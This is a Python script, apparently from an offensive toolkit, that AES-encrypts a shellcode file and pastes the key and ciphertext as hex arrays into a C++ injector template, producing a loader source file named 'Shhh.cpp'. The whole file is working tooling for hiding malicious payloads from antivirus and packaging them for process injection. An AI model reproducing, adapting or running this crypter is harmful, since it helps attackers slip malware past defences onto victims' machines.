import os
import sys
import hashlib
from Cryptodome import Random
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from Cryptodome.Random import get_random_bytes

pure_key = get_random_bytes(16)
key = hashlib.sha256(pure_key).digest()
iv = Random.new().read(AES.block_size)
cipher = AES.new(key, AES.MODE_CBC, iv)

if os.path.isfile(sys.argv[1]):
    # open text file in read mode
    with open(sys.argv[1], "rb") as shell_file:
        # read whole file to a string
        pure_shell = shell_file.read()
        ciphertext = cipher.encrypt(pad(pure_shell, AES.block_size))
        converted_key = ('0x' + ', 0x'.join(hex(x)[2:] for x in pure_key))
        encrypted_payload = ('0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext))

    with open("Injectors/TCH.cpp", "r") as injector:
        plain_injector = injector.read().replace("INSERTKEYHERE", converted_key).replace("INSERTPAYLOADHERE", encrypted_payload)

    with open("EXEs/Shhh.cpp", "w") as output:
        output.write(plain_injector)

else:
    print("--- FAILURE --- ERROR READING PROVIDED FILE FOR ENCRYPTION --- FAILURE --- ")
    exit(0)

